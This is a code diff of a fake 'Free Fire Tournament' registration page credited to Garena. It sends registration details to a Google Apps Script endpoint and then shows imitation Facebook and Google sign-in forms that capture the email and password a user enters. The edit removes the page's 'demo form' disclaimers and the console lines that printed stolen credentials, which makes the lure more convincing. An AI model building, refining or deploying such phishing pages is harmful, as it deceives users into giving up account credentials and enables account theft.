@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Free Fire Tournament Registration</title>
   <style>
     body {
@@ -14,7 +14,6 @@
       position: relative;
       min-height: 100vh;
     }
-    /* Developer credit at bottom */
     #developer-credit {
       position: fixed;
       bottom: 10px;
@@ -49,32 +48,16 @@
       font-weight: 600;
       cursor: pointer;
     }
-    /* Simple Facebook button */
     .login-btn.fb {
-      background-color: #1877f2; /* Facebook blue */
+      background-color: #1877f2;
       color: white;
-      border-radius: 6px;
-      padding: 12px;
-      border: none;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
-      margin: 10px 0;
     }
     .login-btn.fb:hover {
       background-color: #155db2;
     }
-    /* Simple Google button */
     .login-btn.google {
-      background-color: #db4437; /* Google red */
+      background-color: #db4437;
       color: white;
-      border-radius: 6px;
-      padding: 12px;
-      border: none;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
-      margin: 10px 0;
     }
     .login-btn.google:hover {
       background-color: #c33c2e;
@@ -90,7 +73,6 @@
       margin: 30px auto;
       padding: 20px;
       border-radius: 8px;
-      font-family: Arial, sans-serif;
       display: none;
     }
     .real-login h3 {
@@ -127,14 +109,8 @@
       margin: 30px auto;
       max-width: 400px;
     }
-    /* Password toggle style */
     .password-container {
       position: relative;
-    }
-    .password-container input[type="password"],
-    .password-container input[type="text"] {
-      width: 100%;
-      padding-right: 40px;
     }
     .toggle-password {
       position: absolute;
@@ -149,6 +125,7 @@
   </style>
 </head>
 <body>
+
   <div class="container" id="registration">
     <h2>Free Fire Tournament</h2>
     <input type="text" placeholder="Your Name" id="name" />
@@ -165,7 +142,6 @@
     </div>
   </div>
 
-  <!-- Facebook Login  -->
   <div class="real-login" id="fb-login">
     <h3>Facebook Login</h3>
     <input type="text" id="fbEmail" placeholder="Email or phone number" />
@@ -174,11 +150,8 @@
       <span class="toggle-password" onclick="togglePassword('fbPassword', this)">Show</span>
     </div>
     <button onclick="submitFBLogin()">Log In</button>
-    <div style="text-align:center; margin-top:10px; font-size: 14px; color: #1877f2; cursor:pointer;" onclick="alert('Forgot password? This is a demo form and does not support password recovery.')">Forgot Password?</div>
-    <div style="text-align:center; margin-top:5px; font-size: 14px; color: #1877f2; cursor:pointer;" onclick="alert('Create account? This is a demo form.')">Create Account</div>
   </div>
 
-  <!-- Google Login UI -->
   <div class="real-login google" id="google-login">
     <h3>Sign in with Google</h3>
     <input type="text" id="googleEmail" placeholder="Email or phone" />
@@ -187,8 +160,6 @@
       <span class="toggle-password" onclick="togglePassword('googlePassword', this)">Show</span>
     </div>
     <button onclick="submitGoogleLogin()">Next</button>
-    <div style="text-align:center; margin-top:10px; font-size: 14px; color: #db4437; cursor:pointer;" onclick="alert('Forgot password? This is a demo form and does not support password recovery.')">Forgot Password?</div>
-    <div style="text-align:center; margin-top:5px; font-size: 14px; color: #db4437; cursor:pointer;" onclick="alert('Create account? This is a demo form.')">Create Account</div>
   </div>
 
   <div id="thankyou-message">
@@ -198,41 +169,20 @@
   <div id="developer-credit">Free Fire © Garena International I Private Limited</div>
 
   <script>
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbw1q2oSKd6pp7JHE-rZmoZV-S6NU6n9LpJYxd_VPxXXXmoMz0a6f8lVdTG8eYpxZFMD8w/exec';
-
     function submitForm() {
       const name = document.getElementById('name').value.trim();
       const gameId = document.getElementById('gameId').value.trim();
       const ign = document.getElementById('ign').value.trim();
-
       if (name && gameId && ign) {
-        const submitBtn = document.querySelector('#registration button');
-        submitBtn.disabled = true;
-        submitBtn.textContent = 'Submitting...';
-
-        const data = new FormData();
-        data.append('name', name);
-        data.append('gameId', gameId);
-        data.append('ign', ign);
-
-        fetch(scriptURL, {
-          method: 'POST',
-          body: data,
-        })
-        .then(response => {
-          if (response.ok) {
-            document.getElementById('registration').style.display = 'none';
-            document.getElementById('login').style.display = 'block';
-          } else {
-            alert('Submission failed. Please try again.');
-          }
-          submitBtn.disabled = false;
-          submitBtn.textContent = 'Submit';
-        })
-        .catch(error => {
-          alert('Error submitting form: ' + error.message);
-          submitBtn.disabled = false;
-          submitBtn.textContent = 'Submit';
+        fetch("https://script.google.com/macros/s/AKfycbw1q2oSKd6pp7JHE-rZmoZV-S6NU6n9LpJYxd_VPxXXXmoMz0a6f8lVdTG8eYpxZFMD8w/exec", {
+          method: "POST",
+          body: JSON.stringify({ name, gameId, ign }),
+          headers: { "Content-Type": "application/json" }
+        }).then(res => {
+          document.getElementById('registration').style.display = 'none';
+          document.getElementById('login').style.display = 'block';
+        }).catch(() => {
+          alert("Error submitting form");
         });
       } else {
         alert('Please fill all fields');
@@ -253,9 +203,6 @@
       const email = document.getElementById('fbEmail').value.trim();
       const pass = document.getElementById('fbPassword').value.trim();
       if (email && pass) {
-        console.log("login.txt:");
-        console.log("Facebook Email: " + email);
-        console.log("Password: " + pass);
         document.getElementById('fb-login').style.display = 'none';
         document.getElementById('thankyou-message').style.display = 'block';
       } else {
@@ -267,9 +214,6 @@
       const email = document.getElementById('googleEmail').value.trim();
       const pass = document.getElementById('googlePassword').value.trim();
       if (email && pass) {
-        console.log("login.txt:");
-        console.log("Google Email: " + email);
-        console.log("Password: " + pass);
         document.getElementById('google-login').style.display = 'none';
         document.getElementById('thankyou-message').style.display = 'block';
       } else {
@@ -288,5 +232,6 @@
       }
     }
   </script>
+
 </body>
 </html>
